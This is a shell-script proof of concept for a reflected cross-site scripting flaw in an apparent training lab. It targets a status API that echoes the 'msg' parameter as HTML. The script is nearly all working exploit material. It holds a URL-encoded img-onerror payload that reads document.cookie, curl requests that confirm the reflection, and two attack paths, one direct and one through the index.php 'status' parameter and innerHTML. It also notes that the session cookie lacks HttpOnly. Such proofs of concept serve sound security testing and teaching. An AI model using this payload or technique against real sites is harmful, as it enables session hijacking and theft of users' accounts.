#!/bin/sh
# reflected-xss-status.sh - reflected XSS PoC for the Osede Kommun lab.
#
# The status banner on every page loads its text from /api/v1/status/?msg=...
# (visible in the browser's Network tab). The service echoes msg verbatim
# with Content-Type: text/html when the client does not ask for JSON, so a
# payload in the URL executes in the victim's browser.
#
# Usage: poc/reflected-xss-status.sh [base-url]
#   default: http://localhost:8080

set -e

BASE=${1:-http://localhost:8080}
# <img src=x onerror=alert(document.cookie)>
PAYLOAD='%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E'

echo "[*] 1. what the banner's inline script sends (default message):"
curl -s -D - "$BASE/api/v1/status/" | sed -n '1,7p;$p'
echo

echo "[*] 2. path A - direct: replace msg with the payload (open this link in a browser):"
echo "    $BASE/api/v1/status/?msg=$PAYLOAD"
echo
echo "    server response:"
curl -s -D - "$BASE/api/v1/status/?msg=$PAYLOAD" | sed -n '1,7p;$p'
echo

echo "[*] 3. the content type is client-controlled (Accept: application/json is safe):"
curl -s -D - -H 'Accept: application/json' "$BASE/api/v1/status/?msg=$PAYLOAD" | sed -n '1,7p;$p'
echo

echo "[*] 4. path B - via the banner: page param 'status' is fed to the API,"
echo "    the response is written into the banner via innerHTML:"
echo "    $BASE/index.php?status=$PAYLOAD"
echo "    (equivalent request the page's JS issues:)"
curl -s -D - -H 'Accept: text/html' "$BASE/api/v1/status/?msg=$PAYLOAD" | sed -n '1,7p;$p'
echo

echo "[+] if opened in a browser, the payload above executes in the"
echo "[+] $BASE context (alert pops / document.cookie is readable -"
echo "[+] the session cookie is not HttpOnly, see vuln 23)."
